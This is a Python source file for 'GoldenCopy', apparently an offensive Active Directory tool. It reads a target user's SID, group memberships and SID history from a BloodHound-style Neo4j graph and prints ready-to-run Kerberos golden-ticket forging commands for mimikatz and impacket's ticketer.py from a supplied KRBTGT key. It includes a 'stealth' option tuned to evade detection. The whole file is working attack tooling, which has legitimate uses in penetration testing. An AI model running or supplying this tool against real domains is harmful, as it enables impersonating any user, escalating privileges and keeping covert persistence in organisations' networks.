#!/usr/bin/python3
import argparse
import logging
import re

__version__ = '1.3'


def args_parser():
    parser = argparse.ArgumentParser(
        description=f"GoldenCopy v{__version__} - Copy the properties and groups of a user from neo4j to create an identical golden ticket")
    # Logging config
    parser.add_argument('-v', '--verbose', action="count", default=0, dest="verbosity", help="Enable verbose logging")
    # Neo4j connexion config
    neo4j_group = parser.add_argument_group("Neo4j connection configuration")
    neo4j_group.add_argument('-b', '--bolt', type=str, default="bolt://127.0.0.1:7687",
                             help="Neo4j bolt connexion (default: bolt://127.0.0.1:7687)")
    neo4j_group.add_argument('-u', '--username', type=str, default="neo4j", help="Neo4j username (default : neo4j)")
    neo4j_group.add_argument('-p', '--password', type=str, default="exegol4thewin",
                             help="Neo4j password (default : exegol4thewin)")
    # Ticket generations options
    ticket_group = parser.add_argument_group("Ticket configuration")
    ticket_group.add_argument('-t', '--tools', type=str, choices=["mimikatz", "ticketer", "all"], default="all",
                              help="Ticket creation tools (default : all)")
    ticket_group.add_argument('-s', '--stealth', action="store_true", default=False,
                              help="Stealth mode (default : disable)")
    ticket_group.add_argument('-k', '--krbtgt', type=str, default="<KRBTGT Key>", help="KRBTGT RC4,AES Key")
    # Tickets customisation
    advanced_group = parser.add_argument_group("Advanced ticket configuration")
    advanced_group.add_argument('-g', '--groups', type=str,
                                help="Manually add extra group ids (can be separated by commas)")
    advanced_group.add_argument('--sid', type=str,
                                help="Manually add extra sids (SID history) (can be separated by commas)")
    advanced_group.add_argument('-c', '--custom', type=str, default="", help="Custom options")
    # Targeted user
    parser.add_argument('target_object', type=str, help="Target user or computer to copy (format: <username>[@<domain>] or <computer>$[@<domain>] or SID)")
    return parser.parse_args()


def getNeo4jConnection():
    bolt_target: str = args.bolt
    # Check default protocol + host + port format
    pattern_scan = re.match(r'(bolt://)?([\w.-]+)(:\d+)?', bolt_target)
    if pattern_scan:
        if pattern_scan.group(1) is None:
            # Add default missing protocol
            bolt_target = 'bolt://' + bolt_target
        if pattern_scan.group(3) is None:
            # Add default missing port
            bolt_target += ':7687'
    else:
        logger.error(f"Error on neo4j target : {args.bolt}")
        exit(0)
    try:
        g = Graph(bolt_target, auth=(args.username, args.password))
        logger.debug("Neo4j logging successful")
        return g
    except Exception as e:
        logger.critical(e)
        exit(0)


class User:
    # Data class from neo4j returned User object to python object
    def __init__(self, obj, type):
        self.fulluser = obj[0]
        self.username = self.fulluser.split('@')[0]
        self.domain = obj[1]
        self.object_id = obj[2]
        self.user_id = self.object_id.split('-')[-1]
        self.domain_id = '-'.join(self.object_id.split('-')[:-1])
        self.sidhistory = obj[3]
        self.type = type


class Group:
    # Data class from neo4j returned Group object to python object
    def __init__(self, group):
        self.name = group[0]
        self.domain = group[1]
        self.object_id = group[2]
        self.group_id = self.object_id.split('-')[-1]
        self.domain_id = '-'.join(self.object_id.split('-')[:-1])


def findUser(g):
    if args.target_object.endswith("$"):
        # Detect computer object and remove '$' char
        args.target_object = args.target_object[:-1]
        object_type = "Computer"
    else:
        object_type = "User"
    if args.target_object.lower().startswith("s-1-5-21-"):
        # SID mode
        logger.debug("Search user in SID mode")
        context = "objectid"
        match_test = f'(?i){args.target_object}'
        # In SID mode, any object can be matched (expect user to manually select an appropriate object)
        object_type = "Base"
    else:
        # Classic username mode
        context = "name"
        match_test = f'(?i).*{args.target_object}.*'
    req = g.run(f"""MATCH (u:{object_type}) 
    WHERE u.{context} =~ '{match_test}'
    RETURN u.name, u.domain, u.objectid, u.sidhistory, u
    ORDER BY u.enabled DESC,u.name""").to_table()
    user_count = len(req)
    if user_count == 0:
        logger.critical(f"No {object_type.lower()} found !")
        exit(0)
    elif user_count > 1:
        logger.warning(f"Multiple {object_type.lower()} found, please choose one")
        # TODO multiple users found
        logger.warning(req)
        logger.warning(f"Using {req[0][0]}")
    return User(req[0], object_type)


def findGroupFromObj(g, obj):
    req = g.run(f"""MATCH (m:{obj.type} 
    {{objectid: "{obj.object_id}"}}), (n:Group), p=(m)-[:MemberOf]->(n) 
    RETURN n.name, n.domain, n.objectid""")
    data = req.to_table()
    group_count = len(data)
    logger.info(f"{group_count} group found for {obj.fulluser} !")
    groups = [Group(x) for x in data]
    return groups


def keyType():
    key_len = len(args.krbtgt)
    if key_len == 16:
        return "des"
    elif key_len == 32 or key_len == 65:
        return "rc4"  # If 32 Could also be AES 128
    elif key_len == 64:
        return "aes"
    return "default"


def groupList(groups):
    total_groups = set(i.group_id for i in groups)
    if args.groups is not None:
        total_groups.update(args.groups.split(','))
    return ','.join(total_groups)


def extraSidList(user: User):
    total_sid = set(user.sidhistory)
    if args.sid is not None:
        total_sid.update(args.sid.split(','))
    return ','.join(total_sid)


def goldenMimikatz(user, groups):
    logger.info("Creating commands for mimikatz")

    def getKey():
        type = keyType()
        if type == "rc4":
            return f"/rc4:{args.krbtgt}"
        elif type == "aes":
            return f"/aes256:{args.krbtgt}"
        else:
            return f"/krbtgt:{args.krbtgt}"

    def getExtraSid(user):
        sids = extraSidList(user)
        return f"/sids {sids} " if sids != "" else ""

    cmd = f"mimikatz kerberos::golden " \
          f"/user:{user.username} " \
          f"/domain:{user.domain} " \
          f"/id:{user.user_id} " \
          f"/sid:{user.domain_id} " \
          f"{getKey()} " \
          f"/groups:{groupList(groups)} " \
          f"{getExtraSid(user)}" \
          f"{args.custom}"
    if args.stealth:
        cmd += "/startoffset:0 " \
               "/endin:600 " \
               "/renewmax:10080 "
    cmd += "/ptt"
    print(cmd)
    print()
    return cmd


def goldenTicketer(user, groups):
    logger.info("Creating commands for ticketer")

    def getKey():
        type = keyType()
        if type == "rc4":
            return f"-nthash {args.krbtgt}"
        elif type == "des":
            raise NotImplementedError
        else:
            return f"-aesKey {args.krbtgt}"

    def getExtraSid(user):
        sids = extraSidList(user)
        return f"-extra-sid {sids} " if sids != "" else ""

    cmd = f"ticketer.py {getKey()} " \
          f"-domain {user.domain} " \
          f"-domain-sid {user.domain_id} " \
          f"-groups {groupList(groups)} " \
          f"-user-id {user.user_id} " \
          f"{getExtraSid(user)}" \
          f"{args.custom}"
    if args.stealth:
        logger.warning("WARNING: default ticketer duration use days and not hours, you should fix your tools ! "
                       "(stealth require 10 hours tickets)")
        cmd += f"-duration 10 "
    cmd += user.username
    cmd += f" && export KRB5CCNAME=$(pwd)/{user.username}.ccache"
    print(cmd)
    print()
    return cmd


def forgeTicket(user, groups):
    tools = {"mimikatz": goldenMimikatz, "ticketer": goldenTicketer}
    if args.custom != "":
        args.custom += " "
    if args.tools == "all":
        for forgeFunc in tools.values():
            forgeFunc(user, groups)
    else:
        tools.get(args.tools)(user, groups)


def main():
    # init
    global args
    global logger
    args = args_parser()
    logging.basicConfig(format="%(message)s")
    logger = logging.getLogger()
    if args.verbosity == 0:
        logger.setLevel(logging.WARNING)
    elif args.verbosity == 1:
        logger.setLevel(logging.INFO)
    else:
        logger.setLevel(logging.DEBUG)
    # process
    logger.warning(f"GoldenCopy v{__version__}")
    g = getNeo4jConnection()
    user = findUser(g)
    groups = findGroupFromObj(g, user)
    forgeTicket(user, groups)


if __name__ == '__main__':
    from py2neo import Graph

    main()
